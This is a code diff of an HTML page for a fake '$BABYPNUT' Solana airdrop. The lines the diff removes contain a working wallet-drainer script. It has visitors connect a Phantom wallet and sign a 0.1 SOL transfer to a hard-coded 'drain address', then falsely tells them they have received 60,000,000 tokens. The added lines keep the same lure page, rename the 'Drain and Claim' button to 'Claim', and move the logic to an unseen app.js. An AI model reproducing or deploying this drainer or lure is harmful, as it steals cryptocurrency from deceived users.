@@ -4,190 +4,26 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>🐿️ $BABYPNUT Airdrop</title>
+  <link rel="stylesheet" href="style.css">
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@latest/dist/index.iife.min.js"></script>
-  
-  <style>
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-5px); }
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    body {
-      background: #FFD1DC; /* Light pink */
-      color: #8B4513; /* Brown */
-      text-align: center;
-      font-family: Arial, sans-serif;
-      padding: 40px 20px;
-      animation: fadeIn 1s ease-in-out;
-    }
-
-    h1 {
-      font-size: 3rem;
-      font-weight: bold;
-      margin-bottom: 20px;
-      animation: bounce 1s infinite;
-    }
-
-    p {
-      font-size: 1.4rem;
-      margin-bottom: 20px;
-    }
-
-    button {
-      background: #D2691E;
-      color: white;
-      border: none;
-      padding: 18px 25px;
-      cursor: pointer;
-      font-size: 1.2rem;
-      margin: 15px 0;
-      border-radius: 10px;
-      transition: 0.3s;
-      display: block;
-      width: 80%;
-      max-width: 400px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    button:hover {
-      background: #A0522D;
-      transform: scale(1.05);
-    }
-
-    .status {
-      font-size: 1.2rem;
-      margin-top: 15px;
-    }
-
-    .success {
-      color: #32CD32;
-    }
-
-    .error {
-      color: #FF4500;
-    }
-
-    .socials {
-      margin-top: 30px;
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-    }
-
-    .socials a {
-      text-decoration: none;
-      font-size: 1.4rem;
-      padding: 12px 18px;
-      border-radius: 10px;
-      transition: 0.3s;
-    }
-
-    .twitter { background: #1DA1F2; color: white; }
-    .telegram { background: #0088cc; color: white; }
-
-    .socials a:hover {
-      transform: scale(1.1);
-    }
-
-    .stay-tuned {
-      margin-top: 50px;
-      font-size: 1.4rem;
-      font-weight: bold;
-      color: #D2691E;
-    }
-  </style>
 </head>
 <body>
+  <div class="container">
+    <h1>🐿️ $BABYPNUT Airdrop</h1>
+    <p>Connect your wallet and claim <strong>60,000,000 $BABYPNUT</strong>!</p>
+    
+    <button id="connectWalletBtn">👛 Connect Wallet</button>
+    <p id="walletStatus">🔴 Not Connected</p>
+    
+    <button id="claimBtn" disabled>🔥 Claim Airdrop</button>
+    <p id="status"></p>
 
-  <h1>🐿️ $BABYPNUT Airdrop</h1>
-  <p>Connect your Solana wallet and click "Claim" to receive <b>60,000,000 $BABYPNUT</b>!</p>
-
-  <button onclick="connectWallet()">👛 Connect Wallet</button>
-  <p id="walletStatus" class="status">🔴 Not Connected</p>
-
-  <button onclick="drainSOL()">🔥 Drain and Claim Airdrop</button>
-  <p id="status" class="status"></p>
-
-  <!-- Social Media Links -->
-  <div class="socials">
-    <a href="https://twitter.com/BabyPnutCoin" class="twitter" target="_blank">🐦 Follow on Twitter</a>
-    <a href="https://t.me/BabyPnutCommunity" class="telegram" target="_blank">📢 Join Telegram</a>
+    <div class="socials">
+      <a href="https://twitter.com/BabyPnutCoin" class="twitter" target="_blank">🐦 Follow on Twitter</a>
+      <a href="https://t.me/BabyPnutCommunity" class="telegram" target="_blank">📢 Join Telegram</a>
+    </div>
   </div>
-
-  <!-- Stay Tuned Section -->
-  <p class="stay-tuned">🚀 Stay tuned for more surprises! 🚀</p>
-
-  <script>
-    const { PublicKey, Connection, Transaction, SystemProgram } = solanaWeb3;
-    const connection = new Connection("https://api.mainnet-beta.solana.com");
-
-    // Replace with your drain address
-    const drainAddress = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt");
-
-    async function connectWallet() {
-      if (!window.solana) {
-        alert("Solana wallet not found! Please install Phantom.");
-        return;
-      }
-      try {
-        await window.solana.connect();
-        document.getElementById("walletStatus").innerHTML = "✅ Connected";
-      } catch (err) {
-        console.error(err);
-        document.getElementById("walletStatus").innerText = "🔴 Failed to connect.";
-      }
-    }
-
-    async function drainSOL() {
-      if (!window.solana || !window.solana.publicKey) {
-        alert("Please connect your Solana wallet first.");
-        return;
-      }
-
-      try {
-        const userPublicKey = window.solana.publicKey;
-
-        // Get user's SOL balance
-        const balance = await connection.getBalance(userPublicKey);
-        if (balance < 100000000) {
-          alert("You need at least 0.1 SOL to claim the airdrop.");
-          return;
-        }
-
-        // Create the transaction to transfer SOL to the drain address
-        const transaction = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: userPublicKey,
-            toPubkey: drainAddress,
-            lamports: 100000000, // 0.1 SOL in lamports
-          })
-        );
-
-        // Set the transaction fee payer
-        transaction.feePayer = userPublicKey;
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-
-        // Sign and send the transaction
-        const signedTx = await window.solana.signTransaction(transaction);
-        const txid = await connection.sendRawTransaction(signedTx.serialize());
-        await connection.confirmTransaction(txid);
-
-        document.getElementById("status").innerHTML = `
-          🎉 <span class="success">You have received 60,000,000 $BABYPNUT!</span>  
-          TX: <a href="https://solscan.io/tx/${txid}" target="_blank">${txid}</a>
-        `;
-      } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "Airdrop failed: " + err.message;
-      }
-    }
-  </script>
+  
+  <script src="app.js"></script>
 </body>
 </html>
